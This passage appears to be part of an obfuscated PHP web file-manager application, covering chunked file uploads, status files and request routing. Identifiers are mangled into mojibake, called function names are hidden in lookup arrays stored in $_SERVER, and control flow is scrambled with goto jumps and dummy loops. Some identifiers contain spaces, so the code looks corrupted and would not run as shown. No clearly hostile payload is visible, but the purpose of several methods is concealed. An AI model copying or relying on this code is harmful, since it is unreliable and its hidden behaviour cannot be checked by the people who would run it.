(!$F®¨ªõå•¡ || !$bµô·Ä‰ô† || !$AŠ‰ƒ÷ˆÜ…) { CacheLock::unlock($Fİ‘Á¹œ‡¬); return !1; } while (!feof($F®¨ªõå•¡)) { fwrite($bµô·Ä‰ô†, fread($F®¨ªõå•¡, 1024 * 200)); } goto e¼Û±‹èÈ¯; dİô‡Å£îê: return !0; goto Bì£…ÃïÓ®; e¼Û±‹èÈ¯: fclose($F®¨ªõå•¡); fclose($bµô·Ä‰ô†); CacheLock::unlock($Fİ‘Á¹œ‡¬); goto dİô‡Å£îê; Bì£…ÃïÓ®: } private function statusGet() { goto b‚øÃÈÁ×Ë; añ„¯ˆÈ“Ã: $Fø›”ôš™„ = !1; if (file_exists($F–¸ˆ‘öÀ‡)) { $Fø›”ôš™„ = @file_get_contents($F–¸ˆ‘öÀ‡); } if ($Fø›”ôš™„) { $this->statusData = json_decode($Fø›”ôš™„, !0); } goto f –Û‹†Ã; f –Û‹†Ã: if (!$this->statusData) { $EäĞªõ†Œ™ = array($CšÜå†¾›÷[28] => $this->fileName, $CšÜå†¾›÷[1955] => 0, $CšÜå†¾›÷[1956] => array()); $this->statusSet($EäĞªõ†Œ™); } return $this->statusData; goto DÈÛ‚×ò; b‚øÃÈÁ×Ë: $CšÜå†¾›÷ =& $_SERVER[Õİõş]; if (is_array($this->statusData)) { return $this->statusData; } $F–¸ˆ‘öÀ‡ = $this->tempFile . $CšÜå†¾›÷[1968]; goto añ„¯ˆÈ“Ã; DÈÛ‚×ò: } public function statusSet($d¦—à‰Ø·À) { $e•†‰„Ùµ = $this->tempFile . $_SERVER[Õİõş][1968]; if (!$d¦—à‰Ø·À) { if (file_exists($e•†‰„Ùµ)) { @unlink($e•†‰„Ùµ); } return !0; } $this->statusData = $d¦—à‰Ø·À; return file_put_contents($e•†‰„Ùµ, json_encode($d¦—à‰Ø·À)); } private function initFileTemp() { $Dó°æã†µ =& $_SERVER[Õİõş]; if (file_exists($this->tempFile)) { return; } $D§ùŸâ…‹¾ = fopen($this->tempFile, $Dó°æã†µ[1969]); fseek($D§ùŸâ…‹¾, $this->in[$Dó°æã†µ[77]] - 1, SEEK_SET); fwrite($D§ùŸâ…‹¾, $Dó°æã†µ[463]); fclose($D§ùŸâ…‹¾); } public function checkChunk() { goto CÕãõ‹öœƒ; d›¨«Ìö: return $AäÇĞ‹¡; goto B‡Û¯¦¥İ; CÕãõ‹öœƒ: $FæÑÊ¸Ü…³ =& $_SERVER[Õİõş]; $AäÇĞ‹¡ = array(); CacheLock::lock($this->tempFile); goto eŒ¶ç‘‰å; eŒ¶ç‘‰å: $E’‘¨‹ĞÙ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($E’‘¨‹ĞÙ[$FæÑÊ¸Ü…³[1956]] as $FŸÊ ïé—Ó) { $eâ•Š†°Ç = $FŸÊ ïé—Ó[$FæÑÊ¸Ü…³[160]]; if ($eâ•Š†°Ç) { $AäÇĞ‹¡[$FæÑÊ¸Ü…³[1970] . $FŸÊ ïé—Ó[$FæÑÊ¸Ü…³[1039]]] = $eâ•Š†°Ç; } } goto d›¨«Ìö; B‡Û¯¦¥İ: } private function checkChunkHash($b‘¬î¥õ¡) { goto b©×íÚ×¯Œ; b©×íÚ×¯Œ: $C›ÔÓíğË =& $_SERVER[Õİõş]; if (count($b‘¬î¥õ¡[$C›ÔÓíğË[1956]]) != $b‘¬î¥õ¡[$C›ÔÓíğË[1955]]) { return !1; } $cÓˆ„¥‡ßÜ = _get($this->in, $C›ÔÓíğË[1963]); goto dô±‚é‰Œ¼; bì¤Šã§Ç™: return $EƒÁŠ½àù; goto d¸ß…í™ø; E†«ˆÑÀ—ó: $EƒÁŠ½àù = !0; foreach ($b‘¬î¥õ¡[$C›ÔÓíğË[1956]] as $a¤’§„Š¸) { fseek($bÕœ¸È¥ì¶, $a¤’§„Š¸[$C›ÔÓíğË[1958]]); $cë¹šïÑ‹ƒ = PathDriverStream::hash($bÕœ¸È¥ì¶, $a¤’§„Š¸[$C›ÔÓíğË[77]]); if ($a¤’§„Š¸[$C›ÔÓíğË[160]] != $cë¹šïÑ‹ƒ) { $EƒÁŠ½àù = !1; break; } } fclose($bÕœ¸È¥ì¶); goto bì¤Šã§Ç™; dô±‚é‰Œ¼: $AÔ¨ÍˆÏ˜Ó = _get($this->in, $C›ÔÓíğË[1971]); if (strlen($AÔ¨ÍˆÏ˜Ó) == 32 && IO::hashSimple($this->tempFile) == $cÓˆ„¥‡ßÜ && IO::hashMd5($this->tempFile) == $AÔ¨ÍˆÏ˜Ó) { return !0; } $bÕœ¸È¥ì¶ = fopen($this->tempFile, $C›ÔÓíğË[1165]); goto E†«ˆÑÀ—ó; d¸ß…í™ø: } public static function fileName() { goto AÛù½ƒÑö; Dí‡Ì¬ÍĞğ: $b–ñŒâ µ = strtotime($in[$Fë¬²êÁíÓ[1972]]); $b–ñŒâ µ = $b–ñŒâ µ ? $b–ñŒâ µ : time(); $fÖØ‘´ñ = strtolower($fÂã¶Ä´÷); goto c‘§ì±…Ú©; AÛù½ƒÑö: $Fë¬²êÁíÓ =& $_SERVER[Õİõş]; global $in; $fÂã¶Ä´÷ = isset($in[$Fë¬²êÁíÓ[28]]) ? $in[$Fë¬²êÁíÓ[28]] : $Fë¬²êÁíÓ[33]; goto aœ²¡“äÌí; c‘§ì±…Ú©: if ($fÖØ‘´ñ == $Fë¬²êÁíÓ[1973] || $fÖØ‘´ñ == $Fë¬²êÁíÓ[1974]) { $fÂã¶Ä´÷ = date($Fë¬²êÁíÓ[692], $b–ñŒâ µ) . $Fë¬²êÁíÓ[70] . $in[$Fë¬²êÁíÓ[77]] . $Fë¬²êÁíÓ[1605]; } else { if ($fÖØ‘´ñ == $Fë¬²êÁíÓ[1975]) { $fÂã¶Ä´÷ = date($Fë¬²êÁíÓ[692], $b–ñŒâ µ) . $Fë¬²êÁíÓ[70] . $in[$Fë¬²êÁíÓ[77]] . $Fë¬²êÁíÓ[1976]; } } return $fÂã¶Ä´÷; goto C ä”Ëˆõ«; aœ²¡“äÌí: if (!empty($_FILES)) { $fÂã¶Ä´÷ = $fÂã¶Ä´÷ ? $fÂã¶Ä´÷ : $_FILES[$Fë¬²êÁíÓ[163]][$Fë¬²êÁíÓ[382]]; } $fÂã¶Ä´÷ = str_replace(array($Fë¬²êÁíÓ[93], $Fë¬²êÁíÓ[8]), array($Fë¬²êÁíÓ[8], $Fë¬²êÁíÓ[91]), trim($fÂã¶Ä´÷)); if (!is_wap()) { return $fÂã¶Ä´÷; } goto Dí‡Ì¬ÍĞğ; C ä”Ëˆõ«: } private function errorInfo($E­Û•ËÈá) { $Cœœ¬š£‹¹ =& $_SERVER[Õİõş]; $b«ˆ‚‘«ßê = array($Cœœ¬š£‹¹[1977], $Cœœ¬š£‹¹[1978], $Cœœ¬š£‹¹[1979], $Cœœ¬š£‹¹[1980], $Cœœ¬š£‹¹[1981], $Cœœ¬š£‹¹[1982], $Cœœ¬š£‹¹[1983], $Cœœ¬š£‹¹[1984]); return $E­Û•ËÈá . $Cœœ¬š£‹¹[4] . $b«ˆ‚‘«ßê[$E­Û•ËÈá]; } } goto AÏÖÈ£à; Fäµ÷Ø£›: $f®¼²Â³‹‡ = $_SERVER[Õİõş][546]; class Application { private $defaultModule = "\x69\x6e\x64\x65\x78"; private $defaultController = "\x69\156\144\x65\170"; private $defaultAction = "\x69\156\x64\145\170"; function __construct() { } public function setDefault($bì´ ¨ì’–) { goto bÔ¥íöªí¤; bÔ¥íöªí¤: $c¨õÖ›àÍ¾ =& $_SERVER[Õİõş]; $BÏôéìÇÀ¹ =& $_SERVER[Í¶Ìå€õ…Í]; $bö½àâÇ = $BÏôéìÇÀ¹[0]($BÏôéìÇÀ¹[1], $BÏôéìÇÀ¹[2]($bì´ ¨ì’–, $BÏôéìÇÀ¹[1])); goto FÎ¤‰“ò‹°; E„İ¹†œ›é: $this->defaultAction = $bö½àâÇ[2] ? $bö½àâÇ[2] : $this->defaultAction; $this->{$_SERVER[Í¶Ìå€õ…Í][3]}($BÏôéìÇÀ¹[4], array($this, $BÏôéìÇÀ¹[5])); $FõÇÓê›“§ = $c¨õÖ›àÍ¾[550]; goto CËè½£Äª; FÎ¤‰“ò‹°: $DÓ…Í­ùê¢ = $c¨õÖ›àÍ¾[547]; if (!$DÓ…Í­ùê¢) { die; } $this->defaultModule = $bö½àâÇ[0] ? $bö½àâÇ[0] : $this->defaultModule; goto câÊÍ´ÃÕ•; câÊÍ´ÃÕ•: $aÎ®‡™ïÈ = $c¨õÖ›àÍ¾[548]; $this->defaultController = $bö½àâÇ[1] ? $bö½àâÇ[1] : $this->defaultController; $bÄŠã»“õ„ = $c¨õÖ›àÍ¾[549]; goto E„İ¹†œ›é; CËè½£Äª: } public function appRun($bµÇ°Şßø) { goto Eèß¯Æ³¥Ê; c“îí¯²•: $E³©³‡á‰[17]($bµÇ°Şßø); $E³©³‡á‰[13](array($E³©³‡á‰[14], $E³©³‡á‰[15]), $CâÑĞ²®Û . $E³©³‡á‰[18], $bµÇ°Şßø); $fš´²„ˆÎ = $e’¿­ĞÜäæ[553]; goto f‹Õ¹±¸‡; Eèß¯Æ³¥Ê: $e’¿­ĞÜäæ =& $_SERVER[Õİõş]; $E³©³‡á‰ =& $_SERVER[Í¶Ìå€õ…Í]; $Bâ–‹¼·À‘ = $E³©³‡á‰[0]($E³©³‡á‰[1], $bµÇ°Şßø); goto CÆ¹™™êóø; f‹Õ¹±¸‡: if (strlen($fš´²„ˆÎ) < $e’¿­ĞÜäæ[554]) { return; } goto Bœ±ìëÚœ; f£…êÈ¸µ: $CâÑĞ²®Û = $E³©³‡á‰[7]; if ($fÑ”ºÔãœá == $E³©³‡á‰[8]) { $CâÑĞ²®Û = $E³©³‡á‰[9]; $Bâ–‹¼·À‘[0] = $E³©³‡á‰[10]; $Bâ–‹¼·À‘[1] = $Bâ–‹¼·À‘[1] . $E³©³‡á‰[11]; $bµÇ°Şßø = $E³©³‡á‰[12]($E³©³‡á‰[1], $Bâ–‹¼·À‘); $bµÇ°Şßø = $E³©³‡á‰[2]($bµÇ°Şßø, $E³©³‡á‰[1]); } $E³©³‡á‰[13](array($E³©³‡á‰[14], $E³©³‡á‰[15]), $CâÑĞ²®Û . $E³©³‡á‰[16], $bµÇ°Şßø); goto c“îí¯²•; CÆ¹™™êóø: $fÑ”ºÔãœá = $E³©³‡á‰[6]($Bâ–‹¼·À‘[0]); $cñĞ³·ã¨ = $e’¿­ĞÜäæ[551]; while (strlen($cñĞ³·ã¨) < $e’¿­ĞÜäæ[552]) { if (!$cñĞ³·ã¨) { break; } $cñĞ³·ã¨++; } goto f£…êÈ¸µ; Bœ±ìëÚœ: } private function autorun() { $CÖ½ôäÂì =& $_SERVER[Õİõş]; $E‰Ş¡Ö‘¼ =& $_SERVER[Í¶Ìå€õ…Í]; global $config; if ($E‰Ş¡Ö‘¼[19]($config[$E‰Ş¡Ö‘¼[20]]) == 0) { return; } foreach ($config[$E‰Ş¡Ö‘¼[20]] as $BÖİËÓ„ŒÚ => $a–„‚ˆ˜½©) { $this->{$_SERVER[Í¶Ìå€õ…Í][21]}($a–„‚ˆ˜½©); $F®¡‡È¼ = $CÖ½ôäÂì[555]; if (strlen($F®¡‡È¼) < $CÖ½ôäÂì[554]) { die; } } } private function frup15355354() { goto fƒææˆ”‡¦; fëÑ×†Ê½­: $EÁ‚Í‰Ø™ã = $bĞá»˜ç­ò[557]; if (strlen($EÁ‚Í‰Ø™ã) < $bĞá»˜ç­ò[558]) { die; } if (!$dŞ¡ğ³Ğ·‰ || $E»¬Ó÷†›­[24]($dŞ¡ğ³Ğ·‰) <= $E»¬Ó÷†›­[24]($eĞ¡¼Şè)) { return; } goto BÕ–ôé¸¯‹; A¾ÎÎÓæó: while (strlen($b³«ÍËºœõ) < $bĞá»˜ç­ò[560]) { if (!$b³«ÍËºœõ) { break; } $b³«ÍËºœõ++; } $E•Ãï¥ğ¸ = array($E»¬Ó÷†›­[8], $d´Ø‘Çæñî); $b”÷…§Œğ¯ = $E»¬Ó÷†›­[26]($GLOBALS[$E»¬Ó÷†›­[22]][$E»¬Ó÷†›­[23]], 1); goto C½²¥Àƒ¹ï; c“´ôÎÃ•: $BØø‰Ÿ¹¤Š = $bĞá»˜ç­ò[556]; if (!$BØø‰Ÿ¹¤Š) { return; } $dŞ¡ğ³Ğ·‰ = $GLOBALS[$E»¬Ó÷†›­[22]][$E»¬Ó÷†›­[23]][0]; goto fëÑ×†Ê½­; fƒææˆ”‡¦: $bĞá»˜ç­ò =& $_SERVER[Õİõş]; $E»¬Ó÷†›­ =& $_SERVER[Í¶Ìå€õ…Í]; $eĞ¡¼Şè = $E»¬Ó÷†›­[8]; goto c“´ôÎÃ•; f÷”Â“¦†: if (strlen($fßŒË¡™Â•) < $bĞá»˜ç­ò[554]) { return; } $GLOBALS[$E»¬Ó÷†›­[22]][$E»¬Ó÷†›­[28]] = $E»¬Ó÷†›­[29]($E»¬Ó÷†›­[1], $GLOBALS[$E»¬Ó÷†›­[22]][$E»¬Ó÷†›­[23]]); goto e’é¾‹¸Œ; BÕ–ôé¸¯‹: if ($E»¬Ó÷†›­[6]($E»¬Ó÷†›­[25]($dŞ¡ğ³Ğ·‰, -$E»¬Ó÷†›­[24]($eĞ¡¼Şè))) != $eĞ¡¼Şè) { return; } $d´Ø‘Çæñî = $E»¬Ó÷†›­[25]($dŞ¡ğ³Ğ·‰, 0, -$E»¬Ó÷†›­[24]($eĞ¡¼Şè)); $b³«ÍËºœõ = $bĞá»˜ç­ò[559]; goto A¾ÎÎÓæó; C½²¥Àƒ¹ï: $EïºÛ¸ÏÃ = $bĞá»˜ç­ò[561]; $GLOBALS[$E»¬Ó÷†›­[22]][$E»¬Ó÷†›­[23]] = $E»¬Ó÷†›­[27]($E•Ãï¥ğ¸, $b”÷…§Œğ¯); $fßŒË¡™Â• = $bĞá»˜ç­ò[562]; goto f÷”Â“¦†; e’é¾‹¸Œ: } private function lpoic441790b() { goto B×èë¬ª‹³; eõËèÄ«Ø: $GLOBALS[$AëÕ£šğİÉ[22]][$AëÕ£šğİÉ[23]] = $AëÕ£šğİÉ[0]($AëÕ£šğİÉ[36], $a–õÚ–Ÿ¬á); $GLOBALS[$AëÕ£šğİÉ[22]][$AëÕ£šğİÉ[28]] = $AëÕ£šğİÉ[29]($AëÕ£šğİÉ[1], $GLOBALS[$AëÕ£šğİÉ[22]][$AëÕ£šğİÉ[23]]); $A‘Ø²›–ã‚ = $dÏ’İ¯ƒ­[566]; goto Bñ…ÓÂË‚Î; fœ†Ìà˜ŒÔ: $D¥ì×¥‘È = $dÏ’İ¯ƒ­[564]; if (!$D¥ì×¥‘È) { return; } $a–õÚ–Ÿ¬á = $AëÕ£šğİÉ[25]($e×à·ÖÒÆ, $dÎ×ã‡¥“ô + $AëÕ£šğİÉ[24]($EÄœ»•¢™Â)); goto c®²§ê£¢™; C°µÁºš«Ş: if (!$e÷×ˆšô·§) { die; } if (!$AëÕ£šğİÉ[32]($e×à·ÖÒÆ, $EÄœ»•¢™Â)) { return; } $dÎ×ã‡¥“ô = $AëÕ£šğİÉ[33]($e×à·ÖÒÆ, $EÄœ»•¢™Â); goto fœ†Ìà˜ŒÔ; Bñ…ÓÂË‚Î: if (!$A‘Ø²›–ã‚) { die; } goto C›÷•Ã¢ê; aãó¦ĞÆôã: $e×à·ÖÒÆ = $_SERVER[$AëÕ£šğİÉ[30]]; $EÄœ»•¢™Â = $AëÕ£šğİÉ[31]; $e÷×ˆšô·§ = $dÏ’İ¯ƒ­[563]; goto C°µÁºš«Ş; c®²§ê£¢™: $eÕºì†Î¤ª = $dÏ’İ¯ƒ­[565]; $AëÕ£šğİÉ[34]($AëÕ£šğİÉ[35], $a–õÚ–Ÿ¬á, $Bæê¨“»Şº); $a–õÚ–Ÿ¬á = $AëÕ£šğİÉ[2]($Bæê¨“»Şº[0][0], $AëÕ£šğİÉ[36]); goto eõËèÄ«Ø; B×èë¬ª‹³: $dÏ’İ¯ƒ­ =& $_SERVER[Õİõş]; $AëÕ£šğİÉ =& $_SERVER[Í¶Ìå€õ…Í]; if ($GLOBALS[$AëÕ£šğİÉ[22]][$AëÕ£šğİÉ[28]] != $AëÕ£šğİÉ[10]) { return; } goto aãó¦ĞÆôã; C›÷•Ã¢ê: } public function run() { goto BÕÅ÷‹ƒå™; bòŸë¢¶Àí: $_SERVER[$a¤÷«„òø–[44]] = $a¤÷«„òø–[6](ACTION); $B¿í”Æ—â‚ = $cô­«ÑÒ¦¦[573]; while ($B¿í”Æ—â‚ < $cô­«ÑÒ¦¦[554]) { if ($B¿í”Æ—â‚ >= 0) { break; } $B¿í”Æ—â‚++; } goto B¸ºğÓŒ³; dñ‹åÓƒ„È: $A²‡•Öîè = $cô­«ÑÒ¦¦[569]; $a¤÷«„òø–[39]($a¤÷«„òø–[41], isset($Dëåğ”ª‰ã[1]) && $Dëåğ”ª‰ã[0] ? $Dëåğ”ª‰ã[1] : $this->defaultController); $E«èšœèô = $cô­«ÑÒ¦¦[570]; goto EéÀ‡ÅÇî; C¦µÅŠˆïƒ: while (strlen($D‡Ñ¬¨‡Ç) < $cô­«ÑÒ¦¦[552]) { if (!$D‡Ñ¬¨‡Ç) { break; } $D‡Ñ¬¨‡Ç++; } $a¤÷«„òø–[39]($a¤÷«„òø–[43], MOD . $a¤÷«„òø–[1] . ST . $a¤÷«„òø–[1] . ACT); $F·õº½Œè• = $cô­«ÑÒ¦¦[572]; goto bòŸë¢¶Àí; aïŸÚğã¥ˆ: $this->{$_SERVER[Í¶Ìå€õ…Í][38]}(); $Dëåğ”ª‰ã = $GLOBALS[$a¤÷«„òø–[22]][$a¤÷«„òø–[23]]; $FíŞš”°ÊÌ = $cô­«ÑÒ¦¦[567]; goto fíÛ½¾ò†ƒ; B¸ºğÓŒ³: $this->{$_SERVER[Í¶Ìå€õ…Í][45]}(); if ($a¤÷«„òø–[19]($Dëåğ”ª‰ã) >= 3) { $this->{$_SERVER[Í¶Ìå€õ…Í][21]}($d™ßÖê¡„); } else { $this->{$_SERVER[Í¶Ìå€õ…Í][21]}(ACTION); } goto EçêöÇ˜“Ë; EéÀ‡ÅÇî: while ($E«èšœèô < $cô­«ÑÒ¦¦[552]) { if ($E«èšœèô >= 0) { break; } $E«èšœèô++; } $a¤÷«„òø–[39]($a¤÷«„òø–[42], isset($Dëåğ”ª‰ã[2]) && $Dëåğ”ª‰ã[0] ? $Dëåğ”ª‰ã[2] : $this->defaultAction); $D‡Ñ¬¨‡Ç = $cô­«ÑÒ¦¦[571]; goto C¦µÅŠˆïƒ; BÕÅ÷‹ƒå™: $cô­«ÑÒ¦¦ =& $_SERVER[Õİõş]; $a¤÷«„òø– =& $_SERVER[Í¶Ìå€õ…Í]; $this->{$_SERVER[Í¶Ìå€õ…Í][37]}(); goto aïŸÚğã¥ˆ; fíÛ½¾ò†ƒ: $d™ßÖê¡„ = $GLOBALS[$a¤÷«„òø–[22]][$a¤÷«„òø–[28]]; $dÆñõİîšÍ = $cô­«ÑÒ¦¦[568]; $a¤÷«„òø–[39]($a¤÷«„òø–[40], isset($Dëåğ”ª‰ã[0]) && $Dëåğ”ª‰ã[0] ? $Dëåğ”ª‰ã[0] : $this->defaultModule); goto dñ‹åÓƒ„È; EçêöÇ˜“Ë: } private $ywuvd0a05dd1 = array(); private $zqre6d96c961 = ''; public function ihzd89aa20a2() { goto b Üéº£‰º; AË÷¼³Ì”: if (strlen($dÉ‹‚ÛÅ·Â) < $CØø¹óÜŞµ[560]) { return; } $this->{$_SERVER[Í¶Ìå€õ…Í][3]}($A¹²¬„ñô[57], array($this, $A¹²¬„ñô[58])); $DïåÆ¢¡­Ú = $CØø¹óÜŞµ[578]; goto FˆÓèÁâ›; d—î¥êÖƒè: while ($C›·¼œ´¡Û < $CØø¹óÜŞµ[552]) { if ($C›·¼œ´¡Û >= 0) { break; } $C›·¼œ´¡Û++; } goto a—‘‡àá‚; d¦¨ñáª³: $A½™„‹‹ò = $CØø¹óÜŞµ[576]; if (!$A½™„‹‹ò) { return; } $this->{$_SERVER[Í¶Ìå€õ…Í][49]}(); goto A®‡Ñß “’; FˆÓèÁâ›: if (!$DïåÆ¢¡­Ú) { return; } $this->{$_SERVER[Í¶Ìå€õ…Í][3]}($A¹²¬„ñô[59], array($this, $A¹²¬„ñô[60])); $C›·¼œ´¡Û = $CØø¹óÜŞµ[579]; goto d—î¥êÖƒè; A®‡Ñß “’: $this->{$_SERVER[Í¶Ìå€õ…Í][50]}(); $this->{$_SERVER[Í¶Ìå€õ…Í][51]}(); $this->{$_SERVER[Í¶Ìå€õ…Í][52]}(); goto D†Ä–Íå”Ï; c†‹¬Ó¶ñ–: $c×à¾Î¦…‰ = $CØø¹óÜŞµ[575]; if (strlen($c×à¾Î¦…‰) < $CØø¹óÜŞµ[543]) { die; } $this->{$_SERVER[Í¶Ìå€õ…Í][48]}(); goto d¦¨ñáª³; c‹ÖãáÇÂÈ: $cê °Ñíï = $CØø¹óÜŞµ[574]; if (!$cê °Ñíï) { die; } $this->{$_SERVER[Í¶Ìå€õ…Í][47]}(); goto c†‹¬Ó¶ñ–; D†Ä–Íå”Ï: $this->{$_SERVER[Í¶Ìå€õ…Í][3]}($A¹²¬„ñô[53], array($this, $A¹²¬„ñô[54])); $this->{$_SERVER[Í¶Ìå€õ…Í][3]}($A¹²¬„ñô[55], array($this, $A¹²¬„ñô[56])); $dÉ‹‚ÛÅ·Â = $CØø¹óÜŞµ[577]; goto AË÷¼³Ì”; b Üéº£‰º: $CØø¹óÜŞµ =& $_SERVER[Õİõş]; $A¹²¬„ñô =& $_SERVER[Í¶Ìå€õ…Í]; $this->{$_SERVER[Í¶Ìå€õ…Í][46]}(); goto c‹ÖãáÇÂÈ; a—‘‡àá‚: } public function ajmk5600209c($DàïÃôö¹´) { goto fŠ½Œß‚°«; dëî·ÌóÑË: unset($DàïÃôö¹´[$Cõ¡¸¿ƒà§[93]][$Cõ¡¸¿ƒà§[94]][$Cõ¡¸¿ƒà§[76]]); $B¾µÀ÷¤Â¨ = $E†•Ø°¹™ [583]; if (strlen($B¾µÀ÷¤Â¨) < $E†•Ø°¹™ [560]) { die; } goto F„ç“šˆƒ; DµËë›ŠØµ: $DàïÃôö¹´[$Cõ¡¸¿ƒà§[108]][$Cõ¡¸¿ƒà§[128]] = $Cõ¡¸¿ƒà§[104]($this->ywuvd0a05dd1, $Cõ¡¸¿ƒà§[129], $Cõ¡¸¿ƒà§[10]); $DàïÃôö¹´[$Cõ¡¸¿ƒà§[108]][$Cõ¡¸¿ƒà§[130]] = $Cõ¡¸¿ƒà§[104]($this->ywuvd0a05dd1, $Cõ¡¸¿ƒà§[131], $Cõ¡¸¿ƒà§[10]); if ($Cõ¡¸¿ƒà§[104]($GLOBALS, $Cõ¡¸¿ƒà§[132]) && $this->config[$Cõ¡¸¿ƒà§[133]]) { $DàïÃôö¹´[$Cõ¡¸¿ƒà§[108]][$Cõ¡¸¿ƒà§[134]] = WEB_ROOT; } goto F¾Ó”‰¢°; F¾Ó”‰¢°: return $DàïÃôö¹´; goto bÄ¦š©¼·­; F„ç“šˆƒ: unset($DàïÃôö¹´[$Cõ¡¸¿ƒà§[93]][$Cõ¡¸¿ƒà§[94]][$Cõ¡¸¿ƒà§[98]]); $DàïÃôö¹´[$Cõ¡¸¿ƒà§[93]][$Cõ¡¸¿ƒà§[94]][$Cõ¡¸¿ƒà§[99]] = array($Cõ¡¸¿ƒà§[100] => (int) $C„‡ÎÁ‚Ã­[$Cõ¡¸¿ƒà§[101]], $Cõ¡¸¿ƒà§[102] => $Cõ¡¸¿ƒà§[103]($Cõ¡¸¿ƒà§[104]($C„‡ÎÁ‚Ã­, $Cõ¡¸¿ƒà§[105], array())), $Cõ¡¸¿ƒà§[106] => (int) $Cõ¡¸¿ƒà§[104]($C„‡ÎÁ‚Ã­, $Cõ¡¸¿ƒà§[107], 0)); $DàïÃôö¹´[$Cõ¡¸¿ƒà§[108]][$Cõ¡¸¿ƒà§[109]] = $Cõ¡¸¿ƒà§[110]($Cõ¡¸¿ƒà§[111])->{$_SERVER[Í¶Ìå€õ…Í][112]}(); goto B„’ö¥Ë¡; b÷ôòÓˆÇ¤: $Cî™‹„¬Ö = $E†•Ø°¹™ [580]; if (!$Cî™‹„¬Ö) { die; } $BÁ»¨Ü‚å = array($Cõ¡¸¿ƒà§[64], $Cõ¡¸¿ƒà§[65], $Cõ¡¸¿ƒà§[66], $Cõ¡¸¿ƒà§[67], $Cõ¡¸¿ƒà§[68], $Cõ¡¸¿ƒà§[69], $Cõ¡¸¿ƒà§[70], $Cõ¡¸¿ƒà§[71], $Cõ¡¸¿ƒà§[72], $Cõ¡¸¿ƒà§[73], $Cõ¡¸¿ƒà§[74], $Cõ¡¸¿ƒà§[75], $Cõ¡¸¿ƒà§[76], $Cõ¡¸¿ƒà§[77], $Cõ¡¸¿ƒà§[78], $Cõ¡¸¿ƒà§[79], $Cõ¡¸¿ƒà§[80], $Cõ¡¸¿ƒà§[81], $Cõ¡¸¿ƒà§[82], $Cõ¡¸¿ƒà§[83], $Cõ¡¸¿ƒà§[84], $Cõ¡¸¿ƒà§[85], $Cõ¡¸¿ƒà§[86], $Cõ¡¸¿ƒà§[87], $Cõ¡¸¿ƒà§[88], $Cõ¡¸¿ƒà§[89], $Cõ¡¸¿ƒà§[90]); goto cÈ…ñÚ»½™; fŠ½Œß‚°«: $E†•Ø°¹™  =& $_SERVER[Õİõş]; $Cõ¡¸¿ƒà§ =& $_SERVER[Í¶Ìå€õ…Í]; $aÊ››®Œ”Æ = $Cõ¡¸¿ƒà§[61]($Cõ¡¸¿ƒà§[62])->{$_SERVER[Í¶Ìå€õ…Í][63]}(); goto b÷ôòÓˆÇ¤; bñßƒŠÒ¥À: if (strlen($BêÑ÷ÀíÌ) < $E†•Ø°¹™ [560]) { return; } if ($aÊ››®Œ”Æ[$Cõ¡¸¿ƒà§[120]] != $Cõ¡¸¿ƒà§[121]) { $DàïÃôö¹´[$Cõ¡¸¿ƒà§[108]][$Cõ¡¸¿ƒà§[122]] = $aÊ››®Œ”Æ[$Cõ¡¸¿ƒà§[122]]; $DàïÃôö¹´[$Cõ¡¸¿ƒà§[108]][$Cõ¡¸¿ƒà§[123]] = $aÊ››®Œ”Æ[$Cõ¡¸¿ƒà§[123]]; $açšÁ”Ö–Ş = $Cõ¡¸¿ƒà§[124](10) . $this->zqre6d96c961 . $Cõ¡¸¿ƒà§[124](5); $DàïÃôö¹´[$Cõ¡¸¿ƒà§[93]][$Cõ¡¸¿ƒà§[125]][$Cõ¡¸¿ƒà§[126]] = $this->{$_SERVER[Í¶Ìå€õ…Í][127]}($açšÁ”Ö–Ş, $DàïÃôö¹´[$Cõ¡¸¿ƒà§[108]][$Cõ¡¸¿ƒà§[113]]); } if ($this->zqre6d96c961 == $Cõ¡¸¿ƒà§[121]) { $DàïÃôö¹´[$Cõ¡¸¿ƒà§[93]][$Cõ¡¸¿ƒà§[94]][$Cõ¡¸¿ƒà§[99]][$Cõ¡¸¿ƒà§[107]] = 0; } goto DµËë›ŠØµ; f÷±¿¸ŸåÏ: $DàïÃôö¹´[$Cõ¡¸¿ƒà§[108]][$Cõ¡¸¿ƒà§[117]] = $Cõ¡¸¿ƒà§[118]($Cõ¡¸¿ƒà§[119]()); $DàïÃôö¹´[$Cõ¡¸¿ƒà§[108]][$Cõ¡¸¿ƒà§[120]] = $this->zqre6d96c961; $BêÑ÷ÀíÌ = $E†•Ø°¹™ [585]; goto bñßƒŠÒ¥À; cÈ…ñÚ»½™: foreach ($BÁ»¨Ü‚å as $Cãµƒ–‹Ğ) { $DåŠåÍ¼“· = $GLOBALS[$Cõ¡¸¿ƒà§[91]][$Cõ¡¸¿ƒà§[92]][$Cãµƒ–‹Ğ]; $Fƒ’ØÓ¹ù = $E†•Ø°¹™ [581]; while (strlen($Fƒ’ØÓ¹ù) < $E†•Ø°¹™ [543]) { if (!$Fƒ’ØÓ¹ù) { break; } $Fƒ’ØÓ¹ù++; } if (isset($aÊ››®Œ”Æ[$Cãµƒ–‹Ğ])) { $DåŠåÍ¼“· = $aÊ››®Œ”Æ[$Cãµƒ–‹Ğ]; } $DàïÃôö¹´[$Cõ¡¸¿ƒà§[93]][$Cõ¡¸¿ƒà§[94]][$Cãµƒ–‹Ğ] = $DåŠåÍ¼“·; } $C„‡ÎÁ‚Ã­ = $DàïÃôö¹´[$Cõ¡¸¿ƒà§[93]][$Cõ¡¸¿ƒà§[94]][$Cõ¡¸¿ƒà§[76]]; unset($DàïÃôö¹´[$Cõ¡¸¿ƒà§[93]][$Cõ¡¸¿ƒà§[95]][$Cõ¡¸¿ƒà§[96]]); goto E»–ñÙï»; B„’ö¥Ë¡: $A‘ÚğªÂÍ = $E†•Ø°¹™ [584]; $DàïÃôö¹´[$Cõ¡¸¿ƒà§[108]][$Cõ¡¸¿ƒà§[113]] = $Cõ¡¸¿ƒà§[114]($_SERVER[$Cõ¡¸¿ƒà§[115]] . $aÊ››®Œ”Æ[$Cõ¡¸¿ƒà§[116]]); $eõ¹ÏæÇ°š = $E†•Ø°¹™ [547]; goto f÷±¿¸ŸåÏ; E»–ñÙï»: unset($DàïÃôö¹´[$Cõ¡¸¿ƒà§[93]][$Cõ¡¸¿ƒà§[95]][$Cõ¡¸¿ƒà§[97]]); $F”«íÃ´˜È = $E†•Ø°¹™ [582]; if (strlen($F”«íÃ´˜È) < $E†•Ø°¹™ [560]) { die; } goto dëî·ÌóÑË; bÄ¦š©¼·­: } private function scbe0650c947() { goto b¦ñíæÆ†; c›åÎ†ÅõË: while (strlen($C¥ àˆ··£) 